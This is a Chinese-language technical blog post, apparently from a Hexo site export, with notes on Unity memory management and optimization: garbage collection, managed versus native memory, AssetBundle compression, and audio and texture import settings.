指针。当我们把对象放到堆内存时，访问该对象，就需要一个指向该对象的引用，也就是指针,我们不需要显式的使用指针，Clr会对引用进行管理;注意区别指针(引用)与引用类型的区别，当我们说类型是引用类型时，指的是它需要通过指针来访问;而指针存储着一个指向内存的地址。<br>4 指令。处理指令，比如变量声明、数学运算、跳转等</p>\n</blockquote>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>对比参数</th>\n<th>值类型</th>\n<th>引用类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>内存分配(管理)</td>\n<td>线程栈</td>\n<td>托管堆</td>\n</tr>\n<tr>\n<td>内存回收</td>\n<td>直接释放</td>\n<td>等待 GC (垃圾回收器)回收</td>\n</tr>\n<tr>\n<td>new实例</td>\n<td>返回值本身</td>\n<td>返回内存地址，如果垃圾回收器第0代内存满时，可能引起垃圾回收</td>\n</tr>\n<tr>\n<td>变量赋值</td>\n<td>逐字段复制</td>\n<td>赋值内存地址</td>\n</tr>\n<tr>\n<td>类型特点</td>\n<td>轻量、无额外字段</td>\n<td>需要额外字段（类型地址指针、同步块索引）</td>\n</tr>\n<tr>\n<td>常见类型</td>\n<td>数值类型、枚举类型、struct类型</td>\n<td>string、clas类</td>\n</tr>\n<tr>\n<td>是否支持继承</td>\n<td>值类型都是密封类型，所以不支持继承</td>\n<td>单继承</td>\n</tr>\n<tr>\n<td>接口实现</td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>表现方式</td>\n<td>未装箱、已装箱</td>\n<td>总是已装箱</td>\n</tr>\n</tbody></table>\n<ul>\n<li><p>栈的主要功能是什么？</p>\n<blockquote>\n<p>栈的主要功能是跟踪线程执行时的代码指针的位置，以及被调用和返回的数据,可以把它看做一个线程的状态，每个线程都有自己独立的栈。<br>当调用函数时，会将函数的参数压入线程栈，在方法内的局部变量也会压入线程栈顶。方法执行结束后， 返回值被返回。C++中也是一样的</p>\n</blockquote>\n</li>\n<li><p>怎么确定数据分配到了哪个内存区？怎么确定数据分配在栈还是堆上？</p>\n<blockquote>\n<p>值类型和指针总分配在被声明的地方，即他们的分配与声明的位置有关，声明在哪儿就分配在哪儿<br>非空引用类型对象和所有装箱值类型对象总是分配在堆内存上;严格来说，必须在托管堆上分配所有非 null 引用类型对象和所有装箱值类型对象<br>栈内存由当前线程管理,堆内存由 GC 管理</p>\n</blockquote>\n</li>\n<li><p>值类型一定分配在栈上吗？</p>\n<blockquote>\n<p>不是,如果声明在函数的局部变量，就分配到线程栈中；如果声明在一个class类中，就分配在堆内存中</p>\n</blockquote>\n</li>\n<li><p>垃圾回收是如何工作的？垃圾回收的执行过程是什么样的？</p>\n<blockquote>\n<p>1.当GC开始调用时，挂起所有正在运行的线程<br>2.检查堆上的每个对象,回收线程会检查内存堆<br>3.搜索当前对象的所有引用<br>4.没有被引用的对象都是垃圾，被标记为可删除<br>5.最后遍历删除被标记为可删除的对象，释放内存<br>6.最后GC会对剩下的对象进行重定位，同时会更新所有指向这些对象的指针（引用）。这一系列操作在性能消耗方面非常昂贵，所以在编写高性能代码时，要注意栈和堆得内存分配。</p>\n</blockquote>\n</li>\n<li><p>什么情况会触发垃圾回收？</p>\n<blockquote>\n<p>代码需要在托管堆上分配内存时，但发现可分配的空间不足的情况下会触发GC<br>手动代码调用触发GC<br>Unity不定期的触发GC</p>\n</blockquote>\n</li>\n<li><p>内存碎片的现象会造成什么问题？</p>\n<blockquote>\n<p>1:堆内存是一块连续的内存地址，清理其中垃圾之后，就会造成内存碎片。<br>2:内存间隔太小不够放新的对象<br>3:一个托管堆虽然总空间量已经很大了，但是在这个空间里的内存间隔找不到连续空间来存储新的对象.<br>4:如果有内存压缩的 GC 机制,内存碎片就会被清空还给系统,最新版的 Unity 会添加内存压缩的 GC 机制,目前应该在筹备中</p>\n</blockquote>\n</li>\n<li><p>unity什么时候会给堆内存扩容？</p>\n<blockquote>\n<p>如果unity发现托管堆的内存不够分配了，会先进行GC，如果GC之后，发现还是不够分配，就进行托管堆的扩容（扩展），堆扩展的具体数量取决于平台; 但是，大多数Unity平台的大小都是托管堆的两倍。<br>开始分配–&gt;检查托管堆上是否有足够的可分配内存,有就给变量分配内存;没有就触发 Unity 的 GC(垃圾回收)–&gt;检查托管对上是否有足够的可分配内存–&gt;有就给变量分配内存;没有,Unity 就向操作系统申请新的内存(扩充托管对的大小)–&gt;有就给变量分配内存;没有就干掉后台的其他 APP,在没有就再干掉系统服务等等,在没有就杀掉当前 APP</p>\n</blockquote>\n</li>\n<li><p>从代码上有哪些写法是可以避免内存碎片产生的？</p>\n<blockquote>\n<p>不要在频繁调用的函数中反复进行堆内存分配,在像Update()和LateUpdate()这种每帧都调用的函数，可以判断值变化了才调用某个会有堆内存分配的函数，或者计时器到了才调用某个函数<br>清空而不是创建集合,创建新的集合(比如：数组，字典，链表等集合类数据)会导致托管堆上的内存分配 , 如果发现在代码中不止一次地创建新集合，那么我们应该缓存引用到的集合，并使用Clear()清空其内容，而不是重复调用new()<br>尽可能避免C＃中的闭包。在性能敏感的代码中应该尽可能的减少匿名方法和方法引用的使用，尤其是在基于每帧执行的代码中。匿名方法要求该方法能够访问方法范围之外的变量状态，因此已成为闭包。于是C＃通过生成一个匿名类，可以保留闭包所需的外部范围变量。当执行闭包需要实例化其生成的类的副本，并且所有类都是C＃中的引用类型，所以执行闭包需要在托管堆上分配对象。<br>装箱;装箱是Unity中非常常见的非预期的临时内存分配原因之一。只要将值类型值用作引用类型，就会发生这种情况;C＃的IDE和编译器通常不会发出有关装箱的警告，即使它会导致意外的内存分配。这是因为C＃语言是在假设小型临时分配将由分代垃圾收集器和分配大小敏感的内存池有效处理的情况下开发的。虽然Unity的分配器确实使用不同的内存池进行小型和大型分配，但Unity的垃圾收集器是不是分代的，因此不能有效地扫除由装箱生成的小的，频繁的临时分配。在用Unity运行时编写C＃代码时，应尽可能避免使用装箱操作。装箱的一个常见原因是使用enum类型作为词典的键。要解决这个问题，有必要编写一个实现IEqualityComparer接口的自定义类，并将该类的实例指定为Dictionary的比较器;Unity 5.5中的C＃编译器升级显着提高了Unity生成IL的能力。已经从foreach循环中消除了装箱操作。消除了与foreach循环相关的内存开销。(<a href=\"https://blog.csdn.net/salvare/article/details/79935578\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/salvare/article/details/79935578</a>)<br>String相关;在C#中，String字符串是引用类型而不是值类型。C#中的字符串是不可变更的，其引用指向的值在创建后是不可被变更的。因此在创建或者丢弃字符串的时候，会造成托管堆内存分配。推荐做法：减少不必要的字符串创建，提前创建并持有缓存;减少不必要的字符串操作，比如常用的+。每次在对字符串进行操作的时候（例如运用字符串的”+”操作），unity会新建一个字符串用来存储相加后的字符串。然后使之前的旧字符串被标记为废弃，成为内存垃圾。改用StringBuilder类 , StringBuilder就是专门设计用来创建字符串而不产生额外托管堆分配的类，而且可以避免字符串拼接产生垃圾<br>注意由于调用Unity的API所造成的堆内存分配;如果函数需要返回一个数组，则一个新的数组会被创建用作结果返回，简单地缓存一个对数组的引用;函数gameobject.name或gameobject.tag，可以使用一个相关的联合函数。用Input.GetTouch()和Input.touchCount()来代替Input.touches或者用Physics.SphereCastNonAlloc()来代替Physics.SphereCastAll();mesh.vertices 每次调用也是会造成开销的.</p>\n</blockquote>\n</li>\n<li><p>unity的mono堆内存分配后会返还给系统吗？</p>\n<blockquote>\n<p>不会，目前Unity所使用的Mono版本存在一个很严重的问题，Mono的堆内存是只升不降。<br>新一代版本会返回给系统,IL2CPP 版本的也会返回</p>\n</blockquote>\n</li>\n</ul>\n<p>VM : mono的一个VM内存池,虚拟机的内存池.VM内存会返回内存给OS内存,当一块内存 GC 6次没有被访问到,就会将内存放回给OS<br>GC :<br><a href=\"https://www.cnblogs.com/nele/p/5673215.html\" target=\"_blank\" rel=\"noopener\">分代式内存回收</a><br>GC机制考量,<br>Throughput(回收能力):一次GC会回收到多少内存<br>pause times(暂停时长):一次GC对主线程影响多大,会让主线程暂停多少毫秒<br>Fragmentation(碎片化):一次GC内存回收之后,会让整块内存的碎片化增加多少,即不连续内存会增加多少.<br>Mutator overhead(额外消耗):回收本身有消耗,需要考量这个消耗有多大.<br>Soalability(可扩展性):多核多线程时会不会有其他bug<br>Portability(可移植性):在其他平台上面是否可以移植</p>\n<p>目前GC:<br>unity现在使用的是:Boehm(Non-generational)非分代式,(Non-compaction)非压缩方式,内存回收机制,是所有内存同一放在一起的.造成主线程的卡顿</p>\n<ul>\n<li>下一代GC:<ul>\n<li>Incremental GC(渐进式GC),分帧去做GC回收,GC时长还是一样的,但是会避免系统卡顿;目前已转向IL2CPP(升级的Boehm)了.</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>问题:内存下降,但是总体的内存池还是上升了,为什么?<ul>\n<li>是代码碎片化导致的.因为有一块内存一直插不进去当前内存池里面,只能另行开辟内存.也就是内存碎片化没有被压缩.优化建议,先去对大型内存创建和释放,再对小型内存进行创建和释放.</li>\n<li>Zimbie Memory(僵尸内存,别名就叫做脏内存,无用内存) :指内存从开启游戏到游戏关闭只用了一次内存.没有被释放,内存也没有泄露,也没办法使用.内存泄漏指得是没有任何人可以访问和管理到它,也没法释放掉.优化建议:不要觉得 obj == null就是释放掉内存了,显示调用destroy方法才可以释放掉.</li>\n<li>要常用struct不要用class</li>\n<li>Pool In Pool (池中池) 高频使用的小部件需要建立一个内存池,不要频繁的去创建销毁Closures and anonymous methods (闭包和匿名函数,协程) 这些东西最终在C++层全部new成一个class了,优化建议:不要用.关于协程的优化建议:用的时候创建,及时销毁.再用时,再创建,再销毁.</li>\n<li>配置表优化,优化建议,采用C++管理内存,使用C#接口以及Lua接口去查询,而不是在c#和Lua里面保存内存,不要在c#和Lua里面重新全部记录.例如:从C++接过配置表对象时,在c#里面再保存一份,这是错误的方式.</li>\n<li>Singleton 单例慎用,仅在必要时用,最好不要用单例模板,太坑爹的设计了,难用不说还特么代码难看懂,恶心.</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"第三方库-主要是lua优化-–-gt\"><a href=\"#第三方库-主要是lua优化-–-gt\" class=\"headerlink\" title=\"第三方库(主要是lua优化)–&gt;\"></a>第三方库(主要是lua优化)–&gt;</h4><ul>\n<li>需要查看tolua源码以及C++基础,然后在tolua的基础上面做优化,需要的个人能力比较强.<br>以及使用C++库作为插件导入进unity里面使用.</li>\n</ul>\n<h4 id=\"unity底层代码优化方向–-gt\"><a href=\"#unity底层代码优化方向–-gt\" class=\"headerlink\" title=\"unity底层代码优化方向–&gt;\"></a>unity底层代码优化方向–&gt;</h4><p>底层会根据类型将内存分配到不同的Allooator的池子里面,使用GetRuntimeMemory<br>profiler中Memory一项中的Used Total 和 Reserved Total会保持相同的上升或者下降,如果不一致,那就是出bug了.<br>Used Total 表示当前你使用了多少内存<br>Reserved Total表示unity申请了多少内存,将要使用到的内存<br>1: Scene中的GameObject太多,则内存会暴涨.如果在场景中创建了一个GameObject,底层C++会创建一个或者多个object(记录component),去记录这个GameObject的信息.是程序的优化重点,建议:尽量少创建GameObject,并且无用GameObject尽量干掉,优化GameObject个数.<br>2: Audio中会有个缓存池(DSP buffer),需要用户设置,填充满就会向CPU发送播放指令,发送完播放指令才会播放.设置的过大,则音频填充满就会时间过长,声音延迟,设置的过小,就会向CPU频繁发送.优化建议:测试音频播放密集时与不密集时的样本,并进行大小变换设置.<br>Force to mono,双声道音频设置,双声道概念:左右声道播放的不一致的声音.优化建议,设置为单声道.<br>音频格式Format,Mac/iOS上面的音频设置为mp3,有硬件支持.<br>音频压缩格式Compression Format:在哪种情况下使用哪种形态,需要去unity官方手册上面查询.<br>3: CodeSize,模板泛型的乱用,会导致打包速度,并且静态代码量增多.模板泛型,(il2cpp)会在C++层将泛型全部转成静态类型的C++,会变的很大.(一个文件2-3m已经很多了吧,官方视频上说有25M!  …)<br>4: AssetBundle<br>typetree,序列化的时候会生成一个typetree,反序列化的时候会根据这个typetree反序列化.<br>关闭typetree内存会减小,包大小会减小,build和运行时会变快.<br>Lz4 压缩方式,快速压缩,包体大Lzma上面30%,不要用Lzma,lzma会增大内存等等副作用.<br>asset会有头记录部分,以及实际的数据部分,如果每一个都打成ab则有可能发生,头记录部分比实际数据部分还要大,建议是1-2M,5G以后可以加大.<br>5:Resource 文件夹 ,打进包的时候会做一个红黑树(R-B Tree),会检索数据在什么位置,这个里面的数据很大,则红黑树就会很大.优化建议:不要放大量数据就行了,用ab替换.<br>6:Texture<br>upload buffer 这个数据表示填满之后向GPU发送一次,建议测试并平均该值<br>R/W read and write 一般情况下不要开,开启情况会在显存和内存中各一份.<br>mip maps UI情况下不要开就行了.<br>7: mesh<br>R/W 一般情况下不要开. compression在某些unity版本上面开了比不开占用更多内存.</p>\n<h6 id=\"tips-加快Unity编辑器下脚本编译速度\"><a href=\"#tips-加快Unity编辑器下脚本编译速度\" class=\"headerlink\" title=\"tips:加快Unity编辑器下脚本编译速度\"></a>tips:<a href=\"https://www.xuanyusong.com/archives/4474\" target=\"_blank\" rel=\"noopener\">加快Unity编辑器下脚本编译速度</a></h6><p>创建与加载monobehavier以后，内存中有大量这种东西，内存中是没有做过优化的，内存结构不合理，不够紧凑，分散点比较多，cpu也没有将这些事情并行处理，monobehavier里面的方法还是有反射到c++层使用的</p>\n<hr>\n<h1 id=\"C-与非托管DLL进行交互\"><a href=\"#C-与非托管DLL进行交互\" class=\"headerlink\" title=\"C#与非托管DLL进行交互\"></a>C#与非托管DLL进行交互</h1><p><a href=\"https://blog.csdn.net/salvare/article/details/80087488\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/salvare/article/details/80087488</a></p>\n<h1 id=\"Unity内存管理的核心问题\"><a href=\"#Unity内存管理的核心问题\" class=\"headerlink\" title=\"Unity内存管理的核心问题\"></a>Unity内存管理的核心问题</h1><ul>\n<li>1:内存使用是否合适? 内存块大小,碎片化.</li>\n<li>2:内存泄露如何解决? 僵尸内存</li>\n<li>3:Reserved Total 内存总量尽量小于80M</li>\n<li>4:纹理资源内存尽量小于 50M,</li>\n<li>5:网格资源内存尽量小于 20M,模型的 Tangents 尽量选择 None</li>\n<li>6:RenderTexture 内存峰值,需要控制分辨率,需要关注 Antialiasing(反锯齿)</li>\n<li>7:ParticleSystem 粒子系统总体使用数量</li>\n<li>8:AssetBundle资源冗余,如何做到零冗余–&gt;<a href=\"https://blog.uwa4d.com/archives/1577.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/1577.html</a></li>\n<li>9:AssetBundle(SerializedFile)尽量小于 50 个</li>\n<li>10:关注一次性分配过多内存,关注哪个函数在分配内存.配表解析,New Class,String 操作,Instantiate,格式转换</li>\n<li>11:内存泄露,每1000 帧需要获取一下堆内存和变量数.</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://docs.unity.cn/cn/current/Manual/BestPracticeGuides.html\" target=\"_blank\" rel=\"noopener\">https://docs.unity.cn/cn/current/Manual/BestPracticeGuides.html</a><br><a href=\"https://www.bilibili.com/video/BV1aJ411t7N6\" target=\"_blank\" rel=\"noopener\">https://www.bilibili.com/video/BV1aJ411t7N6</a><br><a href=\"https://zhuanlan.zhihu.com/p/61105374\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/61105374</a></p>\n<h1 id=\"GC\"><a href=\"#GC\" class=\"headerlink\" title=\"GC\"></a>GC</h1><ul>\n<li>1:<a href=\"https://mp.weixin.qq.com/s/ARNJtujrHKgxBWuanO0tpA\" target=\"_blank\" rel=\"noopener\">GC优化</a></li>\n</ul>\n<h1 id=\"内存分类\"><a href=\"#内存分类\" class=\"headerlink\" title=\"内存分类\"></a>内存分类</h1><p>Unity 3D中的内存管理 <a href=\"http://onevcat.com/2012/11/memory-in-unity3d/\" target=\"_blank\" rel=\"noopener\">http://onevcat.com/2012/11/memory-in-unity3d/</a></p>\n<h1 id=\"资源内存\"><a href=\"#资源内存\" class=\"headerlink\" title=\"资源内存\"></a>资源内存</h1><p><a href=\"https://www.cnblogs.com/88999660/archive/2013/03/15/2961663.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/88999660/archive/2013/03/15/2961663.html</a></p>\n<h1 id=\"概念理解\"><a href=\"#概念理解\" class=\"headerlink\" title=\"概念理解\"></a>概念理解</h1><h4 id=\"内存\"><a href=\"#内存\" class=\"headerlink\" title=\"内存\"></a>内存</h4><ul>\n<li>物理内存:CPU 访问内存是一个慢速过程,减少Cache Miss,ECS 和 DOTS</li>\n<li>虚拟内存:内存交换,移动设备不支持内存交换,iOS 可以进行内存压缩,Android 没有内存压缩能力</li>\n<li>内存杀手 low memory killer(AKA lmk),内存不足时，killer 会出现，从上图底层一层一层地向上杀。（Cached-Previous-Home…）<br><img src=\"/2020/05/08/Unity/Optimize/Unity%E5%86%85%E5%AD%98%E4%BC%98%E5%8C%96/%E5%86%85%E5%AD%98%E6%9D%80%E6%89%8B.png\" alt=\"内存杀手\"></li>\n</ul>\n<h4 id=\"Unity-内存管理\"><a href=\"#Unity-内存管理\" class=\"headerlink\" title=\"Unity 内存管理\"></a>Unity 内存管理</h4><ul>\n<li>Unity 是一个 C++ 引擎<ul>\n<li>底层代码完全由 C++ 写成</li>\n<li>通过 Wrapper 提供给用户 API ; .binding 链接 C#与 C++的语言,目前逐渐转成 C#</li>\n<li>用户代码会转换为 CPP 代码 （il2cpp）<ul>\n<li>VM 仍然存在（il2cpp vm）,主要是为了跨平台</li>\n</ul>\n</li>\n<li>Editor ,package,都是用 C#写的</li>\n</ul>\n</li>\n<li>Unity 内存按照分配方式分为：<ul>\n<li>Native Memory</li>\n<li>Managed Memory</li>\n<li>Editor &amp; Runtime 是完全不同的<ul>\n<li>不止是统计看到的内存大小不同，甚至是内存分配时机和方式也不同</li>\n<li>Asset 在 Runtime 中如果不读取，是不会进内存的，但 Editor 打开就占内存。因为 Editor 不注重 Runtime 的表现，更注重编辑器中编辑时的流畅。<ul>\n<li>但如果游戏庞大到几十个 G，如果第一次打开项目，会消耗很多时间，有的大的会几天，甚至到一周。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Unity 内存按照管理者分为：<ul>\n<li>引擎管理内存</li>\n<li>用户管理内存（应优先考虑）</li>\n</ul>\n</li>\n<li>Unity 检测不到的内存<ul>\n<li>用户分配的 native 内存<ul>\n<li>自己写的 Native 插件（C++ 插件）， Unity 无法分析已经编译过的 C++ 是如何去分配和使用内存的。</li>\n<li>Lua 完全由自己管理内存，Unity 无法统计到内部的使用情况。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"Unity-游戏应用的4种内存类型\"><a href=\"#Unity-游戏应用的4种内存类型\" class=\"headerlink\" title=\"Unity 游戏应用的4种内存类型\"></a>Unity 游戏应用的4种内存类型</h4><ul>\n<li><p>1: Unity底层(C++层,本机堆,核心代码,unityengine.dll等一系列别称)占用的内存,包含Scene,Audio,CodeSize,贴图等.Unity使用了自己的一套内存管理机制来使这块内存具有和托管堆类似的功能。基本理念是，如果在这个关卡里需要某个资源，那么在需要时就加载，之后在没有任何引用时进行卸载。听起来很美好也和托管堆一样，但是由于Unity有一套自动加载和卸载资源的机制，让两者变得差别很大。自动加载资源可以为开发者省不少事儿，但是同时也意味着开发者失去了手动管理所有加载资源的权力，这非常容易导致大量的内存占用（贴图什么的你懂的），也是Unity给人留下“吃内存”印象的罪魁祸首。       </p>\n</li>\n<li><p>2: Unity的托管堆（Managed Heap）,托管内存,也被称为用户管理的内存,<a href=\"http://www.mono-project.com/Main_Page\" target=\"_blank\" rel=\"noopener\">Mono</a>项目一个开源的.net框架的一种实现，对于Unity开发，其实充当了基本类库的角色。托管堆用来存放类的实例（比如用new生成的列表，实例中的各种声明的变量等）。“托管”的意思是Mono“应该”自动地改变堆的大小来适应你所需要的内存，并且定时地使用垃圾回收（Garbage Collect）来释放已经不需要的内存。关键在于，有时候你会忘记清除对已经不需要再使用的内存的引用，从而导致Mono认为这块内存一直有用，而无法回收。profile可以检测到.并且需要手机查找才正常,经常需要优化的部分.</p>\n</li>\n<li><p>3: 代码文件的内存.如lua脚本本身的内存.C#泛型类的内存,C++层会将泛型编译成静态类型就多出很多文件,尽量注意不要使用太多泛型模板类,shader写的一个,但是编译成很多份的文件等,都是代码文件会占用的内存.<br>程序代码包括了所有的Unity引擎，使用的库，以及你所写的所有的游戏代码。在编译后，得到的运行文件将会被加载到设备中执行，并占用一定内存。这部分内存实际上是没有办法去“管理”的，它们将在内存中从一开始到最后一直存在。一个空的Unity默认场景，什么代码都不放，在iOS设备上占用内存应该在17MB左右，而加上一些自己的代码很容易就飙到20MB左右。想要减少这部分内存的使用，能做的就是减少使用的库。 </p>\n</li>\n<li><p>4: 第三方库的占用的内存,也被称为用户管理的内存,但是已经和unity的内存关系上完全无关了,如自己使用C++编译的库,tolua占用的内存,lua文件占用的内存(这个不是unity管理的),lua占用的内存. 并且unity编辑器的profile无法检测到.</p>\n</li>\n</ul>\n<h1 id=\"Unity-Native-Memory-管理以及优化\"><a href=\"#Unity-Native-Memory-管理以及优化\" class=\"headerlink\" title=\"Unity Native Memory 管理以及优化\"></a>Unity Native Memory 管理以及优化</h1><ul>\n<li><p>Unity 重载了所有分配内存的操作符（C++ alloc、new），使用这些重载的时候，会需要一个额外的 memory label （Profiler-shaderlab-object-memory-detail-snapshot，里面的名字就是 label：指当前内存要分配到哪一个类型池里面）</p>\n</li>\n<li><p>使用重载过的分配符去分配内存时，Allocator 会根据你的 memory label 分配到不同 Allocator 池里面，每个 Allocator 池 单独做自己的跟踪。因此当我们去 Runtime get memory label 下面的池时就可以问 Allocator，里面有多少东西 多少兆。</p>\n</li>\n<li><p>Allocator 在 NewAsRoot 中生成,生成了一个 memory island(root)。在这个 memory island(root) 下面会有很多子内存：shader：当我们加载一个 Shader 进内存的时候，会生成一个 Shader 的 root。Shader 底下有很多数据：sub shader、Pass 等会作为 memory (root) 的成员去依次分配。因此当我们最后统计 Runtime 的时候，我们会统计 Root，而不会统计成员，因为太多了没法统计。</p>\n</li>\n<li><p>因为是 C++ 的，因此当我们 delete、free 一个内存的时候会立刻返回内存给系统，与托管内存堆不一样。</p>\n</li>\n<li><p>Scene</p>\n<ul>\n<li>Unity 是一个 C++ 引擎，所有实体最终都会反映在 C++ 上，而不是托管堆里面。因此当我们实例化一个 GameObject 的时候，在 Unity 底层会构建一个或多个 Object 来存储这个 GameObject 的信息，例如很多 Components。因此当 Scene 有过多 GameObject 的时候，Native 内存就会显著上升。</li>\n<li>当我们看 Profiler，发现 Native 内存大量上升的时候，应先去检查 Scene。</li>\n</ul>\n</li>\n<li><p>Audio</p>\n<ul>\n<li><p>DSP buffer （声音的缓冲）</p>\n<ul>\n<li><p>当一个声音要播放的时候，它需要向 CPU 去发送指令——我要播放声音。但如果声音的数据量非常小，就会造成频繁地向 CPU 发送指令，会造成 I\\O。</p>\n</li>\n<li><p>当 Unity 用到 FMOD 声音引擎时（Unity 底层也用到 FMOD），会有一个 Buffer，当 Buffer 填充满了，才会向 CPU 发送 “我要播放声音” 的指令。</p>\n</li>\n<li><p>DSP buffer 会导致两种问题：</p>\n<ul>\n<li><p>如果（设置的） buffer 过大，会导致声音的延迟。要填充满 buffer 是要很多声音数据的，但声音数据又没这么大，因此会导致一定的<strong>声音延迟</strong>。</p>\n</li>\n<li><p>如果 DSP buffer 太小，会导致 CPU 负担上升，满了就发，消耗增加。</p>\n<p><a href=\"https://docs.unity3d.com/Manual/class-AudioManager.html\" target=\"_blank\" rel=\"noopener\">Audio</a></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Force to mono</p>\n<ul>\n<li>在导入声音的时候有一个设置，很多音效师为了声音质量，会把声音设为双声道。但 95% 的声音，左右声道放的是完全一样的数据。这导致了 1M 的声音会变成 2M，体现在包体里和内存里。因此一般对于声音不是很敏感的游戏，会建议改成 Force to mono，强制单声道。</li>\n</ul>\n</li>\n<li><p>Format</p>\n</li>\n<li><p>Compression Format（看文档，有使用建议）</p>\n</li>\n</ul>\n</li>\n<li><p>Code Size</p>\n<ul>\n<li>C++ 模板泛型的滥用,会影响到 Code Size、打包的速度。会翻译成 CPP 文件,如果泛型过多,则会造成 CPP 过大,每一个泛型都会生成一个对应的 class,都会变成静态类型.<ul>\n<li>可以参考 <a href=\"https://learn.unity.com/tutorial/memory-management-in-unity\" target=\"_blank\" rel=\"noopener\">Memory Management in Unity</a> 3.IL2CPP &amp; Mono 的 Generic Sharing 部分。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>AssetBundle</p>\n<ul>\n<li><p>TypeTree</p>\n<ul>\n<li>Unity 的每一种类型都有很多数据结构的改变，为了对此做兼容，Unity 会在生成数据类型序列化的时候，顺便会生成 TypeTree：当前我这一个版本里用到了哪些变量，对应的数据类型是什么。在反序列化的时候，会根据 TypeTree 来进行反序列化。<ul>\n<li>如果上一个版本的类型在这个版本中没有，TypeTree 就没有它，因此不会碰到它。</li>\n<li>如果要用一个新的类型，但在这个版本中不存在，会用一个默认值来序列化，从而保证了不会在不同的版本序列化中出错，这个就是 TypeTree 的作用。</li>\n</ul>\n</li>\n<li>Build AssetBundle 中有开关可以关掉 TypeTree。当你确认当前 AssetBundle 的使用和 Build Unity 的版本一模一样，这时候可以把 TypeTree 关掉。<ul>\n<li>例如如果用同样的 Unity 打出来的 AssetBundle 和 APP，TypeTree 则完全可以关掉。</li>\n</ul>\n</li>\n<li>TypeTree 好处：<ul>\n<li>内存减少。TypeTree 本身是数据，也要占内存。</li>\n<li>包大小会减少，因为 TypeTree 会序列化到 AssetBundle 包中，以便读取。</li>\n<li>Build 和运行时会变快。源代码中可以看到，因为每一次 Serialize 东西的时候，如果发现需要 Serialize TypeTree，则会 Serialize 两次：<ul>\n<li>第一次先把 TypeTree Serialize 出来</li>\n<li>第二次把实际的东西 Serialize 出来</li>\n<li>反序列化也会做同样的事情，1. TypeTree 反序列化，2. 实际的东西反序列化。</li>\n</ul>\n</li>\n<li>因此如果确定 TypeTree 不会对兼容性造成影响，可以把它关掉。这样对 Size 大小和 Build Runtime 都会获得收益。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>压缩方式：</p>\n<ul>\n<li><p>Lz4</p>\n<p>  <a href=\"https://docs.unity3d.com/2019.3/Documentation/ScriptReference/BuildCompression.LZ4.html\" target=\"_blank\" rel=\"noopener\">BuildCompression.LZ4</a></p>\n<ul>\n<li>LZ4HC “Chunk Based” Compression. 非常快</li>\n<li>和 Lzma 相比，平均压缩比率差 30%。也就是说会导致包体大一点，但是（作者说）速度能快 10 倍以上。</li>\n</ul>\n</li>\n<li><p>Lzma</p>\n<p>  <a href=\"https://docs.unity3d.com/2019.3/Documentation/ScriptReference/BuildCompression.LZMA.html\" target=\"_blank\" rel=\"noopener\">BuildCompression.LZMA</a></p>\n<ul>\n<li>Lzma 基本上就不要用了，因为解压和读取速度上都会比较慢。</li>\n<li>还会占大量内存<ul>\n<li>因为是 Steam based 而不是 Chunk Based 的，因此需要一次全解压</li>\n<li>Chunk Based 可以一块一块解压<ul>\n<li>如果发现一个文件在第 5-10 块，那么 LZ4 会依次将 第 5 6 7 8 9 10 块分别解压出来，每次（chunk 的）解压会重用之前的内存，来减少内存的峰值。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>预告：中国版 Unity 会在下个版本（1月5号或2月份）推出新的功能：基于 LZ4 的 AssetBundle 加密，只支持 LZ4。</p>\n</li>\n<li><p>Size &amp; count</p>\n<ul>\n<li>AssetBundle 包打多大是很玄学的问题，但每一个 Asset 打一个 Bundle 这样不太好。<ul>\n<li>有一种减图片大小的方式，把 png 的头都提出来。因为头的色板是通用的，而数据不通用。AssetBundle 也一样，一部分是它的头，一部分是实际打包的部分。因此如果每个 Asset 都打 Bundle 会导致 AssetBundle 的头比数据还要大。</li>\n</ul>\n</li>\n<li>官方的建议是每个 AssetBundle 包大概 1M~2M 左右大小，考虑的是网络带宽。但现在 5G 的时候，可以考虑适当把包体加大。还是要看实际用户的情况。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Resource 文件夹（<strong>Do not use it</strong>. 除非在 debug 的时候）</p>\n<ul>\n<li>Resource 和 AssetBundle 一样，也有头来索引。Resource  在打进包的时候会做一个红黑树，来帮助 Resource 来检索资源在什么位置，</li>\n<li>如果 Resource 非常大，那么红黑树也会非常大。</li>\n<li>红黑树是不可卸载的。在刚开始游戏的时候就会加载进内存中，会持续对游戏造成内存压力。</li>\n<li>会极大拖慢游戏的启动时间。因为红黑树没加载完，游戏不能启动。</li>\n</ul>\n</li>\n<li><p>Texture</p>\n<ul>\n<li><p>upload buffer，和声音的很像：填满多大，就向 CPU push 一次。</p>\n</li>\n<li><p>r/w</p>\n<ul>\n<li>Texture 没必要就不要开 read and write。正常 Texture 读进内存，解析完了，放到 upload buffer 里后，内存里的就会 delete 掉。</li>\n<li>但如果检测到你开了 r/w 就不会 delete 了，就会在显存和内存中各一份。</li>\n</ul>\n</li>\n<li><p>Mip Maps</p>\n<ul>\n<li>UI 没必要开，可以省大量内存。</li>\n</ul>\n</li>\n<li><p>Mesh</p>\n<ul>\n<li>r/w</li>\n<li>compression<ul>\n<li>有些版本 Compression 开了不如不开，内存占用可能更严重，具体需要自己试。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Assets</p>\n<ul>\n<li><p>Assets 的数量实际上和 asset 整个的纹理是有关系的。（？）</p>\n<p><a href=\"https://learn.unity.com/tutorial/memory-management-in-unity\" target=\"_blank\" rel=\"noopener\">Memory Management in 